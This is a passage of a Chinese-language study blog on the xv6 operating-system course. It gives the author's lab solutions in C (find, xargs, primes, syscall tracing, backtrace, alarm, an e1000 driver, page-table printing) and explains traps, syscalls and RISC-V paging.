  path++;  return path;&#125;int isSubstring(char* s1, char* s2)&#123;    int M = strlen(s1);    int N = strlen(s2);    /* A loop to slide pat[] one by one */    for (int i = 0; i &lt;= N - M; i++) &#123;        int j;        for (j = 0; j &lt; M; j++)            if (s2[i + j] != s1[j])                break;        if (j == M)            return 1;    &#125;    return 0;&#125;int isNotDots(char* name) &#123;  int len = strlen(name);  return len &gt;= 3 || (len == 2 &amp;&amp; name[0] != &#x27;.&#x27; &amp;&amp; name[1] != &#x27;.&#x27;) || (len == 1 &amp;&amp; name[0] != &#x27;.&#x27;);&#125;voidfind(char *path, char *pat, int has)&#123;  char buf[512], *p;  int fd;  struct dirent de;  struct stat st;  if((fd = open(path, 0)) &lt; 0)&#123;    fprintf(2, &quot;ls: cannot open %s\\n&quot;, path);    return;  &#125;  if(fstat(fd, &amp;st) &lt; 0)&#123;    fprintf(2, &quot;ls: cannot stat %s\\n&quot;, path);    close(fd);    return;  &#125;  switch(st.type)&#123;  case T_FILE:    if (has)      printf(&quot;%s\\n&quot;, path);    break;  case T_DIR:    if(strlen(path) + 1 + DIRSIZ + 1 &gt; sizeof buf)&#123;      printf(&quot;ls: path too long\\n&quot;);      break;    &#125;    strcpy(buf, path);    p = buf+strlen(buf);    *p++ = &#x27;/&#x27;;    while(read(fd, &amp;de, sizeof(de)) == sizeof(de))&#123;      if(de.inum == 0)        continue;      memmove(p, de.name, DIRSIZ);      p[DIRSIZ] = 0;      if(stat(buf, &amp;st) &lt; 0)&#123;        printf(&quot;ls: cannot stat %s\\n&quot;, buf);        continue;      &#125;      char* filename = getFilename(buf);      if (isNotDots(filename)) &#123;        find(buf, pat, has || isSubstring(pat, filename));      &#125;    &#125;    break;  &#125;  close(fd);&#125;intmain(int argc, char *argv[])&#123;  find(argv[1], argv[2], 0);  exit(0);&#125;\nxargs\n因為我從沒用過xargs所以一開始寫根本不知道這要幹嘛\nxargs就是讀stdout，用空格或斷行當成分隔，去invoke指令\n不過這裡在讀的時候要一直loop，就算你知道test data基本上一次就讀的完\n可以順便說說虛假喚醒的原因\n\n喚醒會把所有proc設定成可以跑(runnable)\nscheduler只會挑出一個proc跑\n如果這個proc做一下改變，就直接被切走…\n\n但其他proc還是runnable!!\n這樣其他proc還是被wakeup的!!\n\n\n\n虛假喚醒是來自preemptive schedule，所以只能在每次wakeup時確認需要的前提有沒有對，才繼續跑\n#include &quot;kernel/types.h&quot;#include &quot;kernel/stat.h&quot;#include &quot;user/user.h&quot;char*strncpy(char *s, const char *t, int n)&#123;  char *os;  os = s;  while(n-- &gt; 0 &amp;&amp; (*s++ = *t++) != 0)    ;  while(n-- &gt; 0)    *s++ = 0;  return os;&#125;intmain(int argc, char *argv[])&#123;  char buf[10][32];  char tmp[32];  char *cmd[10];  for (int i=1;i&lt;argc;i++)     strncpy(buf[i-1], argv[i], strlen(argv[i]));  while (read(0, tmp, 32) &gt; 0) &#123; // 虛假喚醒!!    char *start = tmp;    int end = argc-1;    for(int len=strlen(tmp),i=0;i&lt;len;i++)      if (tmp[i] == &#x27; &#x27; || tmp[i] == &#x27;\\n&#x27;) &#123;        tmp[i] = 0;        strcpy(buf[end++], start);        start = tmp+i+1;      &#125;    for (int i=0;i&lt;end;i++)      cmd[i] = (char*)&amp;(buf[i]);    if (fork())      wait(0);    else      exec(buf[0], cmd);  &#125;  exit(0);&#125;\nprimes\n全部裡面最有趣的，也是考驗會不會用pipe\n這裡的做法是，每個stage(go)\n\n取第一個數字作為這邊的質數\n剩下塞到新的pipe，產生下一個stage\n\n#include &quot;kernel/types.h&quot;#include &quot;kernel/stat.h&quot;#include &quot;user/user.h&quot;void put(int *p, int n) &#123;\twrite(p[1], &amp;n, sizeof(int));&#125;int get(int *p) &#123;\tint ret;\tint state = read(p[0], &amp;ret, sizeof(int));\tif (state &lt;= 0)\t\treturn state;\telse\t\treturn ret;&#125;void endWrite(int *p) &#123;\tclose(p[1]);&#125;void endRead(int *p) &#123;\tclose(p[0]);&#125;void go(int *p) &#123;\t// WARN: get a item one time!!\tint b = get(p);\tif (b &gt; 0) &#123;\t\tprintf(&quot;prime %d\\n&quot;, b);\t\tint n = get(p);\t\tif (n &gt; 0) &#123;\t\t\tint pp[2];\t\t\tpipe(pp);\t\t\tif (fork() == 0) &#123;\t\t\t\tendWrite(pp);\t\t\t\tgo(pp);\t\t\t&#125; else &#123;\t\t\t\tendRead(pp);\t\t\t\tfor(;n &gt; 0;n=get(p))\t\t\t\t\tif (n % b != 0)\t\t\t\t\t\tput(pp,n);\t\t\t\tendWrite(pp);\t\t\t\twait(0);\t\t\t&#125;\t\t&#125;\t&#125;\tendRead(p);&#125;int main() &#123;\tint p[2];\tpipe(p);\tif (fork() == 0) &#123;\t\tendWrite(p);\t\tgo(p);\t&#125;\telse &#123;\t\tendRead(p);\t\tfor (int n=2;n&lt;36;n++)\t\t\tput(p,n);\t\tendWrite(p);\t\twait(0);\t&#125;\texit(0);&#125;\nch2\nIsolation\n隔離是由下面兩個東西提供保證的\n\n硬體\n\n執行模式\n\n\nOS\n\nprocess (使用不同的stack)\n其他 (cgroup, 權限管理…)\n\n\n\n先看執行模式\n執行模式\nRISC-V 有三種模式，CPU 可以執行指令：\n\n機器模式\n監督者（supervisor）模式\n\nCPU 被允許執行特權指令：例如，啟用和禁用中斷，讀寫保存頁表地址的寄存器等\n\n\n用戶模式\n\nCPU提供了一個特殊的指令(ecall)，可以將 CPU 從用戶模式切換到監督模式，並在內核指定的入口處進入內核。\n一個關鍵的設計問題是操作系統的哪一部分應該在監督者模式下運行。\n\n宏內核\n\n整個操作系統駐留在內核中，這樣所有系統調用的實現都在監督者模式下運行\n\n\n微內核\n\n減少在監督者模式下運行的操作系統代碼量，而在用戶模式下執行操作系統的大部分代碼\n\n\n\nprocess\nprocess 就是 一台電腦\n\n硬體\n\nkernel syscall\n\n\nCPU\n\nconcurrent mechnism\n\nprocess state\n\n\n\n\nmem\n\npage table\n\nstack\n\nkernel stack (kstack)\nuser stack\n\n\n\n\n\n\n\n透過assign不同的pagetable讓process只能看到與使用一部份的mem，這樣就算把自己的搞壞也沒關係\nprocess的mem layout\n\nxv6 只使用 39 位中的 38 位。因此，最大地址是 2^38-1 = 0x3fffffffff，也就是 MAXVA\n在地址空間的頂端，xv6 保留了一頁，用於 trampoline 和映射進程trapframe 的頁，以便切換到內核\ntrace: init\n在kernel load完後會call init去setup shell\n這裡主要是看怎麼從kernel mode變成user mode\n\nloader 将 xv6 内核加载到物理地址 0x80000000 的内存中\n\n0x80000000 而不是 0x0，是因为地址范围 0x0-0x80000000 包含 I/O 设备。\n\n\n_entry处的指令设置了一个栈(stack0)，这样xv6就可以运行C代码\n\n注意\n\nstack0被宣告在start.c\nriscv的stack是往下長的!!\n\n所以，entry.S做的事用一句話來說\n\nsp = stack0+PGSIZE\n\n\n\n\n\n\n\n\n跑到start\n\n這裡是machine mode\n\n設定切hyperviser mode\n關中斷\n關paging\n設定pc成main\n設定timer的東西 (timerinit)\n用mret跳去main，同時切成hyperviser mode\n\n\n\n\n跑main\n\n設定各種設定\n最後跑userinit，跑kernel的第一個程式\n\n\n在main跑userinit，就會去帶init\n\nalloc proc之後設定一些基本訊息\n把跑init的binary (exec(&quot;/init&quot;))，copy到proc的記憶體中\n\nbinary的asm在user的initcode.S\n\n就是透過a7去打exec\nexec會把記憶體換掉，所以變成init\n\ninit(init.c)做兩件事\n\nfork: 開sh\nmain: 一直wait，zombie或是shell之類的proc\n\n\n\n\n同時之後init跑完就會變成user mode\n\n為什麼會變成user mode??\n\n看到exec\n\n先讀elf\n用uvmalloc設定pagetable\n\nuvmalloc設定PTE時會代PTE_U (usermode記憶體)\n\n\n\n\n之後到syscall的流程 (usertrapret)\n\n設定user mode\n設定user pagetable\nuserret做ctx switch+trap的switch\n\n\n\n\n\n\n\n\n\n\n\n\n\ntrace: syscall\nuser mode的syscall\n\nusys.pl\n\ninclude syscall.h拿syscall編號\n會產生一段設定a7的asm\n這就是syscall\n\n\n\nkernel mode的syscall\n\nsyscall.h\n\n這裡有所有syscall的編號\n\n\nusys.pl的ecall觸發trap，切到kernel mode\n\ntrap之後會提，反正會到usertrap\n看mstatus，之後跑syscall\n根據num，跑對應的syscal\nreturn code寫到a0，之後透過剩下的trap流程\n\n回到usertrap\n跑usertrapret(切pagetable與user mode)，userret\n\n\n\n\n\nuser的參數怎麼pass到syscall的?\n以argint為例\n\ncall argraw\n\nargraw直接拿trapframe的value\n在此如果是addr也是這樣拿到addr\n\n但是之後要處理pagetable的copyin, copyout接手去複製資料\n\n\n\n\n\nLab System calls\ntrace\n就是在proc上設定mask，之後只要syscall時就看mask決定要不要print\n// ...extern uint64 sys_trace(void);extern uint64 sys_sysinfo(void);static uint64 (*syscalls[])(void) = &#123;    // ...    [SYS_trace]   sys_trace,    [SYS_sysinfo]   sys_sysinfo,&#125;;static char* syscallnames[24] = &#123;  &quot;&quot;,  &quot;fork&quot;,  &quot;exit&quot;,  &quot;wait&quot;,  &quot;pipe&quot;,  &quot;read&quot;,  &quot;kill&quot;,  &quot;exec&quot;,  &quot;fstat&quot;,  &quot;chdir&quot;,  &quot;dup&quot;,  &quot;getpid&quot;,  &quot;sbrk&quot;,  &quot;sleep&quot;,  &quot;uptime&quot;,  &quot;open&quot;,  &quot;write&quot;,  &quot;mknod&quot;,  &quot;unlink&quot;,  &quot;link&quot;,  &quot;mkdir&quot;,  &quot;close&quot;,  &quot;trace&quot;,  &quot;sysinfo&quot;,&#125;;voidsyscall(void)&#123;  // ...  struct proc *p = myproc();  // ...  if(num &gt; 0 &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;    p-&gt;trapframe-&gt;a0 = syscalls[num]();    if ((1 &lt;&lt; num) &amp; p-&gt;tracemask)      printf(&quot;%d: syscall %s -&gt; %d\\n&quot;, p-&gt;pid, syscallnames[num], p-&gt;trapframe-&gt;a0); //   &#125; else &#123;    // ...  &#125;&#125;\nsysinfo\n這裡的重點是\n\n數freemem\n數unused procs\n\n數unused procs就是從proc表去數\nint getAllocedProcsCount(void) &#123;  int ret = 0;  for(struct proc *p = proc; p &lt; &amp;proc[NPROC]; p++)    if (p-&gt;state != UNUSED)      ret++;  return ret;&#125;\n數freemem從freelist去數(幸好是用page去分不然會很麻煩)\n4096是page的大小(PGSIZE)\nint getFreeMemAmount(void) &#123;  int ret = 0;  for(struct run* ptr = kmem.freelist; ptr; ptr=ptr-&gt;next)    ret += 4096;  return ret;&#125;\n剩下的問題是怎麼copy struct過去\n所以我們需要copy addr過去user space的struct\nuint64sys_sysinfo(void)&#123;  uint64 infoAddr; // user pointer to struct stat  if(argaddr(0, &amp;infoAddr) &lt; 0)    return -1;  struct sysinfo info = &#123;    .freemem = getFreeMemAmount(),    .nproc = getAllocedProcsCount(),  &#125;;  struct proc* p = myproc();  if(copyout(p-&gt;pagetable, infoAddr, (char *)&amp;info, sizeof(info)) &lt; 0)    return -1;  return 0;&#125; \nch4&amp;5\ntrap\ntrap有3種\n\nfrom user mode (syscall)\nfrom device (device interrupt)\nfrom cpu (exception)\n\ntrap通常的順序是\n\ntrap 迫使控制權轉移到內核\n內核保存寄存器和其他狀態，以便恢復執行\n內核執行適當的處理程序代碼（例如，系統調用實現或設備驅動程序）\n內核恢復保存的狀態，並從 trap 中返回\n代碼從原來的地方恢復。\n\nXv6 trap 處理分為四個階段\n\nRISC-V CPU 採取的硬件行為\n為內核 C 代碼準備的彙編入口\n處理 trap 的 C 處理程序\n系統調用或設備驅動服務\n\nRISC-V trap mechinism\n重要的reg\nstvec：內核在這裡寫下 trap 處理程序的地址；RISC-V 到這裡來處理 trap。\nsepc：當 trap 發生時，RISC-V 會將程序計數器保存在這裡（因為 PC 會被 stvec 覆蓋）。\nsret: 從 trap 中返回\nscause：RISC -V 在這裡放了一個數字，描述了 trap 的原因。\nsscratch：內核在這裡放置了一個值，這個值會方便 trap 恢復/儲存用戶上下文。\nsstatus: 類似attr，SIE 位控制設備中斷是否被啟用，SPP 位表示 trap 是來自用戶模式還是監督者模式，並控制sret 返回到什麼模式\nRISC-V 硬件對所有的 trap 類型（除定時器中斷外）進行以下操作\n\n如果該 trap 是設備中斷，且 sstatus SIE 位為 1\n\n通過清除 SIE 來禁用中斷\n複製 pc 到 sepc\n將當前模式(用戶或監督者)保存在 sstatus 的 SPP 位\n在 scause 設置該次 trap 的原因\n將模式轉換為監督者\n將 stvec 複製到 pc\n執行新的 pc\n\n\n\nCPU 不會切換到內核頁表，不會切換到內核中的棧，也不會保存 pc 以外的任何寄存器!!\n內核軟件必須執行這些任務!!\ntrace: trap from user space\n\n\n從proc的trampoline開始\n\n跑uservec (kernel mode，因為是中斷)\n\n保存狀態到trapframe\n\ntrapframe可以\n\n保存所有用户寄存器\n指向当前进程的内核栈\n当前 CPU 的 hartid\nusertrap 的地址和内核页表的地址的指针\n\n\n\n\n換kernel pagetable (透過設定satp)\n跳usertrap (kernel mode)\n\n設定stvec成kernelvec\n保存pc\nsyscall或是device interrupt\n\n\n\n\n\n\n\nusertrap完到usertrapret (kernel mode)\n\n設定成stvec，要到uservec\n把kernel資訊寫到trapframe\n設定pc (trap的重點!!!)\n設定user pagetable\n設定user mode\n跳到userret (user mode)\n\n把trapframe載回去\nreturn 到原本的位置\n\n\n\n\n\ntrace: exec syscall\n\n用戶代碼將 exec 的參數放在寄存器 a0 和 a1 中，並將系統調用號放在 a7 中\n系統調用號與函數指針表 syscalls 數組(kernel/syscall.c:108)中的項匹配 (from trapframe的a7)\necall 指令進入內核，執行uservec、usertrap，然後執行 syscall\n當系統調用函數返回時，syscall 將其返回值記錄在 p-&gt;trapframe-&gt;a0 中\n\n如果有pointer?\n透過kernel function去load\n使用 fetchstr 從用戶空間中檢索字符串文件名參數，fetchstr 調用 copyinstr 來做這些困難的工作\ntrap from kernel space\nkernel的trap因為在kernel所以不用換pagetable、stvec\n同時因為大家都有自己的kstack，所以可以把registrer存在stack上\n\nkernelvec\n\n保存狀態到kstack\n跳到kerneltrap (會回來kernelvec)\n\n保存pc, sstatus, scause\n\npc很正常，但sstatus,scause!?\n\n如果是timer interupt會yield\n等回來，會需要原本的sstatus,scause\n\n\n\n\n做該做的事\n\ntimer的preemptive切換在這裡實現\n\n\n回復sstatus,scause之後return\n\n\n從kstack回復狀態\n\n\n\ntrap from device\n許多設備驅動程序在兩個 context 中執行代碼：\n上半部分(top half)在進程的內核線程中運行\n下半部分(bottom half)在中斷時執行\n上半部分是通過系統調用，如希望執行 I/O 的read 和 write。\n這段代碼可能會要求硬件開始一個操作（比如要求磁盤讀取一個塊）；然後代碼等待操作完成。\n最終設備完成操作並引發一個中斷。\n驅動程序的中斷處理程序，作為下半部分，推算出什麼操作已經完成，如果合適的話，喚醒一個等待該操作的進程，並告訴硬件執行下一個操作。\ntrace: Console input\nUART 硬件在軟件看來是一組內存映射的控制寄存器 (不用port操作啦)\n當 UART 接收到一個字節的輸入時，就產生一個接收中斷，當 UART 每次完成發送一個字節的輸出時產生一個傳輸完成(transmit complete)中斷(kernel/uart.c:53)。\ntrap 處理程序調用 devintr(kernel/trap.c:177)，它查看 RISC-V 的 scause 寄存器，發現中斷來自一個外部設備。\n然後它向一個叫做 PLIC的硬件單元詢問哪個設備中斷了(kernel/trap.c:186)。\n如果是 UART，devintr 調用 uartintr。\nuartintr (kernel/uart.c:180) 從 UART 硬件中讀取在等待的輸入字符，並將它們交給consoleintr (kernel/console.c:138)；\n它不會等待輸入字符，因為以後的輸入會引發一個新的中斷。\nconsoleintr 的工作是將中輸入字符積累 cons.buf 中，直到有一行字符\n一旦被喚醒，consoleread 將會注意到 cons.buf 中的完整行，並將其將其複製到用戶空間，並返回（通過系統調用）到用戶空間。\ntrace: Console output\nwrite 系統調用最終會到達 uartputc(kernel/uart.c:87)。\n設備驅動維護了一個輸出緩衝區(uart_tx_buf)，uartputc 將每個字符追加到緩衝區調用 uartstart 來啟動設備發送(如果還沒有的話)，然後返回\n每次 UART 發送完成一個字節，它都會產生一個中斷。\nuartintr 調用 uartstart，uartintr檢查設備是否真的發送完畢，並將下一個緩衝輸出字符交給設備，每當 UART 發送完一個字節，就會產生一個中斷\nTimer interrupts\nRISC-V 要求在機器模式下處理定時器中斷，而不是監督者模式。\n因此，xv6 對定時器中斷的處理與上面談到的 trap 機製完全分離了。\n所以都在start中設定\n\n對 CLINT 硬件（core-local interruptor）進行編程，使其每隔一定時間產生一次中斷\n設置一個類似於 trapframe 的 scratch 區域，幫助定時器中斷處理程序保存寄存器和 CLINT 寄存器的地址\n\n所以前面trap要保留scratch的內容\n\n\n將 mtvec 設置為 timervec，啟用定時器中斷\n\n中斷之後由clockintr處理 (tick++)\n\n\n\ninterrupt還是要處理concurent\n內核代碼需要注意它可能會被暫停（由於定時器中斷），然後在不同的 CPU 上恢復\n等等，一直發trap?\nUART 驅動器通過讀取 UART 控制寄存器，一次檢索一個字節的數據\n這種模式被稱為編程 I/O，因為軟件在驅動數據移動。\n程序化 I/O 簡單，但速度太慢，無法在高數據速率下使用。\n需要高速移動大量數據的設備通常使用直接內存訪問（DMA）\nDMA 設備硬件直接將傳入數據寫入 RAM，並從 RAM 中讀取傳出數據\n當設備在不可預知的時間需要關注時，中斷是很有用的，而且不會太頻繁。\n但中斷對 CPU的開銷很大。\n因此，高速設備，如網絡和磁盤控制器，使用了減少對中斷需求的技巧。\n其中一個技巧是對整批傳入或傳出的請求提出一個單一的中斷。\n另一個技巧是讓驅動程序完全禁用中斷，並定期檢查設備是否需要關注。\n這種技術稱為輪詢（polling）。\n如果設備執行操作的速度非常快，輪詢是有意義的\n但如果設備大部分時間處於空閒狀態，則會浪費 CPU 時間\n一些驅動程序會根據當前設備的負載情況，在輪詢和中斷之間動態切換\nLab Traps\nbacktrace\ndefs.h加\nvoid            backtrace(void);\n接著hint有提到sp與fp，所以就直接用吧\n但這裡用struct讓code好看一點\n注意到riscv是小頭，所以mem addr小的會被放到struct最前面\n這段我是加在printf.c\nstruct stk_frame&#123;  void * prev_frame_plus_16;  uint64 ret_addr;&#125;;static inline uint64r_fp()&#123;  uint64 x;  asm volatile(&quot;mv %0, s0&quot; : &quot;=r&quot; (x) );  return x;&#125;/*riscv是小頭所以addr越小，在c struct會被往上面放stack是往下長 (addr-8)所以寫struct要把下面的往struct的上面放 (stack倒著放)*/void backtrace(void) &#123;  struct stk_frame* now = (struct stk_frame*)(r_fp()-16);  uint64 start = PGROUNDDOWN(now-&gt;ret_addr);  for (struct stk_frame* now = (struct stk_frame*)(r_fp()-16); now-&gt;ret_addr &gt; start; now=now-&gt;prev_frame_plus_16-16)    printf(&quot;%p\\n&quot;, now-&gt;ret_addr);&#125; \n最後就直接call\nuint64sys_sleep(void)&#123;  int n;  uint ticks0;  backtrace();  if(argint(0, &amp;n) &lt; 0)    return -1;// ...&#125;\nfp &amp; sp\nfrom hint\nsp就是目前stack的top\nfp就是保存caller訊息的addr\ncaller reg: caller要存，換言之，在call完function後可能會被破壞掉\ncallee reg: callee要還原，換言之，在call完function後他們的值還是對的\nalarm\n如果timer動了就call一下callback，透過兩個syscall，sigalarm與sigreturn\n但要怎麼到callback去，是要在kernel mode跑??\ntimer interupt最後會回到user mode，所以只要讓他不要回到原本的位置就好!!\n這手法我們看過了，usertrapret與usertrap與kerneltrap都是透過改pc完成的\n所以我們也改pc到callback，但是執行時的狀態怎麼辦，要怎麼回去原本的狀態?\n再多一個trapframe存原本的trapframe，在alarmreturn把原本的frame設回去\nsysproc.c\nuint64 sys_sigreturn(void) &#123;  struct proc * p = myproc();  p-&gt;acc = 0;  memmove(p-&gt;trapframe, p-&gt;trapframe2, sizeof(struct trapframe));  return 0;&#125;uint64 sys_sigalarm(void) &#123;  struct proc* p = myproc();  if(argint(0, &amp;p-&gt;cnt) &lt; 0)    return -1;  if(argaddr(1, &amp;p-&gt;cb) &lt; 0)    return -1;  return 0;&#125;\ntrap.c\n// ...  if(which_dev == 2) &#123;    if (p-&gt;cnt) &#123;      if (++p-&gt;acc == p-&gt;cnt) &#123;        memmove(p-&gt;trapframe2, p-&gt;trapframe, sizeof(struct trapframe));        p-&gt;trapframe-&gt;epc = p-&gt;cb;      &#125;    &#125;    yield();  &#125;// ...\nLab network driver\n在2019的版本是要實現stack與driver的，所以很累，但2020就不用實現stack\ndriver\ndriver的重點是怎麼與device溝通\niface都是用ring buffer去存資料\nxx_ring就是device的buffer的狀態，然後他們是array\n那是要取哪一個??\nwrite: 取E1000_TDT，這是接下去dirver要寫的位置\nread: 取E1000_RDT，這是iface已經讀完的位置\nxx_mbuf是ring buffer對應到的memory\n所以\nwrite: 把tx_ring[regs[E1000_TDT]]的狀態設定好，把addr指向第一個位置\nread: 先拉regs[E1000_TDT]+1的mbuf，之後用新的mbuf蓋掉原本的\nint inc(int i, int len) &#123; return (i+1) % len; &#125;inte1000_transmit(struct mbuf *m)&#123;  acquire(&amp;e1000_lock);  int i = regs[E1000_TDT], ret;  if ((tx_ring[i].status &amp; E1000_TXD_STAT_DD) == 0) &#123;    printf(&quot;not ready for trasmit&quot;);    ret = -1;  &#125; else &#123;    // free previous mbuf    if (tx_mbufs[i])      mbuffree(tx_mbufs[i]);    tx_ring[i].addr = (uint64)m-&gt;head;    tx_ring[i].length = m-&gt;len;    tx_ring[i].cmd = E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS;    tx_mbufs[i] = m;    regs[E1000_TDT] = inc(i, TX_RING_SIZE);    ret = 0;  &#125;  release(&amp;e1000_lock);  return ret;&#125;// allocate mbuf for ifacestatic voide1000_recv(void)&#123;  for (int i = inc(regs[E1000_RDT], RX_RING_SIZE);rx_ring[i].status &amp; E1000_RXD_STAT_DD;i = inc(regs[E1000_RDT], RX_RING_SIZE)) &#123;    acquire(&amp;e1000_lock);    struct mbuf* pkt = *(rx_mbufs+i);    mbufput(pkt, rx_ring[i].length);    rx_mbufs[i] = mbufalloc(0);    // 從哪邊塞    rx_ring[i].addr = (uint64)rx_mbufs[i]-&gt;head;    rx_ring[i].status = 0;    regs[E1000_RDT] = i;    release(&amp;e1000_lock);    net_rx(pkt);  &#125; &#125;\nnetwork stack\n雖然說不用實現一個network stack，但我們可以trace看看\nrx\n\nnet_rx\n\n拉eth_header\n判斷type決定要去哪\n\nntohs去轉數字\n\n\n\n\nnet_rx_ip\n\n拉ip_header\n各種判斷與check\n\ncksum\nrouting\n\n這裡只有看是不是給我們，不是就丟了\n\n\n\n\n算udp長度\n送去udp\n\n\nnet_rx_udp\n\n拉udp_header\n各種判斷與check\n把sip, sport, dport抓出來，送到sockrecvudp\n\n\nsockrecvudp\n\n找到對的socket\n把pkt塞到socket的queue\n\n\n\ntx\n\nsockwrite\n\nalloc mbuf\ncopy data\n送到net_tx_udp\n\n\nnet_tx_udp\n\n把sip, sport, dport轉成network order\n設定udp header，並加在mbuf上\n送到net_tx_ip\n\n\nnet_tx_ip\n\n與net_tx_udp很像，轉資料，加在mbuf上\n送到net_tx_eth\n\n\n不存在的routing\n\n一般來說從ip到eth或是eth到ip之間要過routing\n決定要繼續往上還是直接轉出去\n\n以linux的netfilter為例\n\n\n\n\n\nnet_tx_eth\n\n塞ethaddr，加在mbuf上\n\n這裡是直接boardcast，所以迴避了arp\n\n\ncall e1000_transmit\n\n\n\nch3\n來了，最難的部分，撐過去就會有全新的方式看待c了!!\n為什麼會難?\n\n很難debug，一個是要知道結構，也要只到這個數字對應到什麼，還有concurrent要處理\n都是uint64\n之後會在va, pte, pa一直轉來轉去\n\nkernel mem layout\n\n\n当内核通过高地址映射使用 stack 时，它们也可以通过直接映射的地址被内核访问\n\n内核使用“直接映射”RAM 和内存映射设备寄存器，也就是在虚拟地址上映射硬件资源，这些地址与物理地址相等。\n\n例如，内核本身在虚拟地址空间和物理内存中的位置都是KERNBASE=0x80000000。直接映射简化了读/写物理内存的内核代码。\n\n\n\n\n\npagetable\npage table就是把virtual address(va)，丟到table換出physical address(pa)\n\n硬體上是分成3層，也因為多了一層抽象，所以可以多點attr\n\n像後面就是看page有沒有PTE_V(Page Table Entry, PTE)，決定這個page是不是free\n要告訴硬件使用頁表，內核必須將根頁表頁的物理地址寫入 satp 寄存器中\npte, pagetable都是存在pa中!!\n如何map &amp; 如何把va換成pa\npagetable就是hashtable，所以要先知道key,value到底要什麼?\nkey: va，在程式中跑的數字；pte，可以換出pagetable或是pa的數字，可以把pte當成page開頭的pa(見walk)\nvalue: pa，真實mem的addr\ntrace: free mem怎麼產生的\n把kernel的memory layout打開來\n\n中間的free memory就是我們需要的東西\n接著就是怎麼讓free memory可以被分配，要先切塊\n\nkinit\n\nfreerange\n\n從end到PHYSTOP跑kfree\n\nkfree就是加linked list\n\n\n\n\n\n\n\n如何把va換成pa: walk\n就是模擬在table跳的過程，一層一層換pte，到最後就可以用kalloc拿pa，利用pa設定對應的pte\n之後回傳對應的pa\n那怎麼從va拿pte?\n再看回去這張圖\n\n注意到va最右手邊就是12個offset，之後看到pte的右手邊是10位flag，所以轉成pte就是把12位拿掉再把10位補回去\n#define PA2PTE(pa) ((((uint64)pa) &gt;&gt; 12) &lt;&lt; 10)#define PTE2PA(pte) (((pte) &gt;&gt; 10) &lt;&lt; 12)#define PTE_FLAGS(pte) ((pte) &amp; 0x3FF)\n剩下就是walk三層table了\n// extract the three 9-bit page table indices from a virtual address.#define PXMASK          0x1FF // 9 bits#define PXSHIFT(level)  (PGSHIFT+(9*(level)))#define PX(level, va) ((((uint64) (va)) &gt;&gt; PXSHIFT(level)) &amp; PXMASK)// Return the address of the PTE in page table pagetable// that corresponds to virtual address va.  If alloc!=0,// create any required page-table pages.//// The risc-v Sv39 scheme has three levels of page-table// pages. A page-table page contains 512 64-bit PTEs.// A 64-bit virtual address is split into five fields://   39..63 -- must be zero.//   30..38 -- 9 bits of level-2 index.//   21..29 -- 9 bits of level-1 index.//   12..20 -- 9 bits of level-0 index.//    0..11 -- 12 bits of byte offset within the page.pte_t *walk(pagetable_t pagetable, uint64 va, int alloc)&#123;  if(va &gt;= MAXVA)    panic(&quot;walk&quot;);  for(int level = 2; level &gt; 0; level--) &#123;    pte_t *pte = &amp;pagetable[PX(level, va)];    if(*pte &amp; PTE_V) &#123;      pagetable = (pagetable_t)PTE2PA(*pte);    &#125; else &#123;      if(!alloc || (pagetable = (pde_t*)kalloc()) == 0)        return 0;      memset(pagetable, 0, PGSIZE);      *pte = PA2PTE(pagetable) | PTE_V;    &#125;  &#125;  return &amp;pagetable[PX(0, va)];&#125;\n如何map: mappages\nmappages就是walk很多次，一次一個page\n如果完成map就可以用c的*做操作!!\n十分神奇，前面還是當成數字操作，之後就可以直接dereference\ntrace: 怎麼做mem alloc\nmem alloc，就是\n\nkalloc拿一塊page，拿到一個pa\nmappages在pagetable中設定va到pa\n\ntrace: 怎麼free mem/pagetable\nfree mem就是\n\nuvmunmap\n\n會walk拉出pa\n檢查有沒有被map過(有PTE_V)\n如果有要free，就kfree\n\n\n\nfree pagetable比較麻煩\n\nuvmfree\n\nuvmunmap把所有pa去掉\nwalkfree把pte去掉\n\n\n\ntrace: how to create kernel page table\n\nkvminit設定kernel_pagetable\n\n跑kvmmake會生出kernel pagetable\n\n先kalloc一塊放pagetable\n之後照layout設定\n\n\n\n\nkvminithart\n\n設定satp\n\n\nhow to access a page table:\n\npagetable_t，它實際上是一個指向 RISC-V 根頁表頁的指針 (pa)\n\n\n\nprocess mem layout\n\n當一個進程要求 xv6 提供更多的用戶內存時，xv6 首先使用 kalloc 來分配物理頁，然後將指向新物理頁的 PTE 添加到進程的頁表中。\nxv6 使用 PTE_V 來清除不使用的 PTE\ntrampoline是負責跳到hypervisor mode的code\ntrapframe是在跳之前保存process狀態的地方\ntrace: sbrk\n回傳目前的終點(sz)，之後算與原本size的差，之後調用uvmalloc 或 uvmdealloc縮放自己的大小\ntrace: exec\n\nopen binary exe (namei)\nparse ELF\n從proc_pagetable分配一個page，之後用uvmalloc為剩下的proc配置page\n\nexec配出來的mem layout可以看process mem layout的圖\nBefore labs\n在做lab之前先看看要怎麼為某個va做map，會做兩件事\n\n拿一塊page\n把va指(map)過去\n\n這裡的va不一定是剛好在page的起點上!!\n記得，所有mem都要以page為單位\n\n\n\n故要先介紹兩個macro，因為之後很常用到\n\nPGROUNDUP: page的終點\n\nusage: exec在alloc elf的執行檔後要alloc stack，就是先取PGROUNDUP，之後stack從PGROUNDUP開始alloc\n\n\nPGROUNDDOWN: page的起點\n\nusage: mappages在一開始就先對傳進來的va做PGROUNDDOWN，之後才開始alloc\n\n\n\nLab Page tables\nvmprint\n小試身手，抄freewalk，走過每個pte即可\nvoid vmprint_dfs(pagetable_t pagetable, int dep) &#123;  if (*pagetable &lt; MAXVA)    for(int i = 0; i &lt; 512; i++)&#123;      pte_t pte = pagetable[i];      if((pte &amp; PTE_V) &amp;&amp; pte &lt; MAXVA)&#123;        uint64 child = PTE2PA(pte);        for (int j=0;j&lt;dep;j++)          printf(&quot;.. &quot;);        printf(&quot;..%d: ptr %p pa %p\\n&quot;, i, pte, child);        vmprint_dfs((pagetable_t)child, dep+1);      &#125;    &#125;&#125;void vmprint(pagetable_t pagetable) &#123;  printf(&quot;page table %p\\n&quot;, pagetable);  vmprint_dfs(pagetable, 0);&#125;\nnew copyin, copyinstr\n現在想把user mode的資料加到kernel mode的表，這樣就不用copy來copy去\n先要有產生kernel pagetable的函數，並在struct proc中多加一個kernel pagetable\nvoid kpgtinit(pagetable_t t) &#123;  memset(t, 0, PGSIZE);  // uart registers  if (mappages(t, UART0, PGSIZE, UART0, PTE_R | PTE_W) &lt; 0)    panic(&quot;kpgtinit: uart0\\n&quot;);  // virtio mmio disk interface  if (mappages(t, VIRTIO0, PGSIZE, 